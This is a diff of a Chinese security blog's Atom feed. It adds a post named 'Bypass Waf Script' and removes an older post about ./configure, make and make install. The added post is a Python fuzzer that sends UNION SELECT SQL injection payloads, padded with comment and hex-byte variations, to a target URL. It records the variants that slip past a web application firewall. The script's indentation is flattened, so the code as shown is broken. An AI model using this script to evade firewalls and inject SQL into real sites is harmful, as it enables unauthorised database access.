@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://vuln.top/"/>
-  <updated>2020-06-18T04:07:08.470Z</updated>
+  <updated>2020-06-18T06:04:16.509Z</updated>
   <id>https://vuln.top/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Bypass Waf Script</title>
+    <link href="https://vuln.top/2020/06/18/bypass/"/>
+    <id>https://vuln.top/2020/06/18/bypass/</id>
+    <published>2020-06-18T06:04:16.509Z</published>
+    <updated>2020-06-18T06:04:16.509Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.235.133/2.php?a=1&quot;</span><br><span class="line">Fuzz_a = [&apos;/*!14450&apos;,&apos;*/&apos;,&apos;/**/&apos;,&apos;/&apos;,&apos;-&apos;,&apos;+&apos;]</span><br><span class="line">#Fuzz_a = [&apos;&apos;]</span><br><span class="line">Fuzz_b = [&apos;&apos;]</span><br><span class="line">#Fuzz_c = [&apos;%0a&apos;,&apos;%0b&apos;,&apos;%0c&apos;,&apos;%0d&apos;,&apos;%0e&apos;,&apos;%0f&apos;,&apos;%0h&apos;,&apos;%0i&apos;,&apos;%0j&apos;]</span><br><span class="line">Fuzz_c = []</span><br><span class="line">for line in open(&apos;HexValsAllBytes.txt&apos;,&apos;r&apos;).readlines():</span><br><span class="line">    Fuzz_c.append(line.strip(&apos;\n&apos;))</span><br><span class="line"></span><br><span class="line">FUZZ = Fuzz_a+Fuzz_b+Fuzz_c</span><br><span class="line">#配置fuzz字典</span><br><span class="line">header = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&apos;&#125;</span><br><span class="line">#设置请求的headers</span><br><span class="line">for a in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for b in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for c in FUZZ:</span><br><span class="line">for d in FUZZ:</span><br><span class="line">pass</span><br><span class="line">for e in FUZZ:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">PYLOAD = &quot;/*!uNion&quot;+a+b+c+d+e+&quot;seLect*/1,3333&quot;</span><br><span class="line">urlp = url+PYLOAD</span><br><span class="line">#print(urlp)</span><br><span class="line">res = requests.get(urlp,headers=header)</span><br><span class="line">#print(res.text)</span><br><span class="line">#使用for排列组合fuzz字典并请求页面</span><br><span class="line">if &apos;1xiaobai13333&apos; in res.text:  #这个flag需要改，根据你测的正常页面中，有什么字段是必然出现的</span><br><span class="line">print (&quot;[*]URL:&quot;+ urlp +&quot;BYPASS！&quot;)</span><br><span class="line">f=open(&apos;result.txt&apos;,&apos;a&apos;)</span><br><span class="line">f.write(urlp+&quot;\n&quot;)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>C/S 渗透测试-1</title>
@@ -442,29 +463,6 @@
 &lt;ol&gt;
 &lt;li&gt;-l  列出所有可用的payload,编码器,空指令……&lt;/li&gt;
 &lt;li&gt;-p  指定
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Linux软件安装 ./configure,make,make install的作用</title>
-    <link href="https://vuln.top/2019/02/21/40/"/>
-    <id>https://vuln.top/2019/02/21/40/</id>
-    <published>2019-02-21T03:45:05.948Z</published>
-    <updated>2019-02-21T03:45:05.961Z</updated>
-    
-    <content type="html"><![CDATA[<!--markdown-->自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。<p>./configure(配置）<br>configure会根据当前系统环境和指定参数生成makefile文件，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr 意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin （而不是默认的 /usr/local/bin),资源文件就会安装在 /usr/share（而不是默认的/usr/local/share）。同时一些软件的配置文件你可以通过指定 –sys-config= 参数进行设定。有一些软件还可以加上 –with、–enable、–without、–disable 等等参数对编译加以控制，你可以通过允许 ./configure –help 察看详细的说明帮助。它常用的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">–help：输出帮助信息</span><br><span class="line">–prefix=PREFIX：将所有文件安装到PREFIX文件夹下。实际上不同的文件会被安装到不同的子文件夹中。</span><br><span class="line">–exec-prefix=EXEC-PREFIX：结构依赖文件的安装位置。默认与PREFIX相同。</span><br><span class="line">–bindir=BINDIR：可执行程序目录。默认为EXEC-PREFIX/bin。</span><br><span class="line">–datadir=DATADIR：程序所需只读文件的目录。默认为PREFIX/share。</span><br><span class="line">–sysconfdir=SYSCONFDIR：配置文件的目录。默认为PREFIX/etc。</span><br><span class="line">–libdir=LIBDIR：库文件和动态装在模块的目录。默认为EXEC-PREFIX/lib。</span><br><span class="line">–includedir=INCLUDEDIR：C和C++头文件的目录。默认是PREFIX/include。</span><br><span class="line">–docdir=DOCDIR：文档文件目录。默认是PREFIX/doc。</span><br><span class="line">–mandir=MANDIR：手册目录。默认是PREFIX/man。</span><br><span class="line">–with-includes=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录被加入到编译器的头文件中。例如：–with-includes=/opt/gun/includes/</span><br><span class="line">–with-libraries=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录用于查找库文件。例如：–with-libraries=/opt/gnu/lib:/usr/sup/lib</span><br><span class="line">–enable-locale：打开区域支持。</span><br><span class="line">–enable-recode：打开单字节字符集记录的支持。</span><br><span class="line">–enable-multibyte：允许使用多字节编码。</span><br></pre></td></tr></table></figure><p>make（编译）<br>make，这一步就是编译，当执行make的时候，make会在当前目录下搜索Makefile（makefile）这个文本文件，而makefile里面记录了源码如何编译的详细信息。</p><p>make install（安装）<br>make insatll，这条命令来进行安装，这一步一般需要你有 root 权限（因为要向系统写入文件）。</p><p>其他命令：</p><p><code>make clean</code> 清除编译产生的可执行文件及目标文件。<br><code>make distclean </code>除了清除可执行文件和目标文件外，把configure所产生的Makefile也清除掉。<br><code>make dist </code>将程序和相关的档案包装成一个压缩文件以供发布。<br>怎么卸载编译安装(make install)的软件？<br>使用安装包自带的反安装程序<br>常见的反安装target有： make uninstall/distclean/veryclean 等，但并不是每个源代码包都提供反安装，这不是个通用方法等。</p><p>通过删除编译时设置的单独目录<br>如果编译时设置了–prefix到一个单独的文件夹，就删除那个文件夹即可，但如果编译安装到了类似/usr这种地方，找一个临时目录重新安装一遍，如：</p><p><code>./configure –prefix=/tmp/to_remove && make install</code></p><p>然后遍历/tmp/to_remove的文件，删除对应安装位置的文件即可。</p><p>通过安装日志删除<br>安装日志里能够看得到到底安装了那些文件到那些位置，通常会使用’cp’或者’install’命令拷贝文件。可以事先记得记录’make install’的所有输出日志，’make install &amp;&gt; |tee make.log’。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!--markdown--&gt;自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。
-
-&lt;p&gt;./configure(配置）&lt;br&gt;configu
       
     
     </summary>
